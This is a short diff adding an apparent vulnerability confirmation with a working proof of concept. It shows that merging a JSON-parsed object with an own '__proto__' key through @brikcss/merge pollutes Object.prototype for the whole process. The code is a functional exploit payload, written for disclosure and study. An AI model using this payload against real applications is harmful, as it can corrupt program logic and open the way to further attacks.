@@ -1,0 +1,20 @@
+Confirmed the prototype pollution works via `require("@brikcss/merge")`.
+
+```javascript
+// Prototype Pollution in @brikcss/merge (Merge.objects, via the `_joinPath`/`t`
+// helper's unguarded "parent" key path) - merging a JSON-derived object whose
+// own enumerable key is "__proto__" walks straight into Object.prototype and
+// mutates it in place.
+const merge = require("@brikcss/merge");
+
+// JSON.parse creates a real *own* property named "__proto__" (unlike an
+// object literal, where {__proto__: ...} just sets the prototype instead of
+// creating an own key), so Object.keys() picks it up as a normal key.
+const malicious = JSON.parse('{"__proto__":{"polluted":"yes"}}');
+
+merge({}, malicious);
+
+// Every object in the process is now polluted.
+console.log(({}).polluted);          // "yes"
+console.log(Object.prototype.polluted); // "yes"
+```
